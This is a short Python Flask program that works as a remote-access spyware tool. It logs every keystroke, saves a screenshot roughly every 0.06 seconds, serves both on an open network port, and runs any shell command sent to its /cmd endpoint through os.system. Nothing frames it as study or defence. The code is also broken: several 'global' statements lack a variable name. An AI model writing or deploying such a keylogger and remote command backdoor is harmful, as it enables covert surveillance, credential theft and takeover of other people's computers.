from flask import Flask, render_template, request
from keyboard import on_press
from pyscreenshot import grab
from threading import Thread
from time import sleep
from os import system

app = Flask(__name__)
s = ""


def press(event):
    global
    s += event.name + " "


def shot():
    while True:
        grab().save("screen.png")
        sleep(0.06)


@app.route("/clear")
def clear():
    global
    s = ""
    return render_template("back.html")


@app.route("/screen.png")
def screen():
    return open("screen.png", "rb").read()


@app.route("/cmd", methods=["POST"])
def cmd():
    system(request.form.get("area"))
    return render_template("back.html")


@app.route("/")
def index():
    global
    return render_template("index.html", s=s)


if __name__ == "__main__":
    on_press(press)
    Thread(target=shot).start()
    app.run(host="0.0.0.0", port=1145)
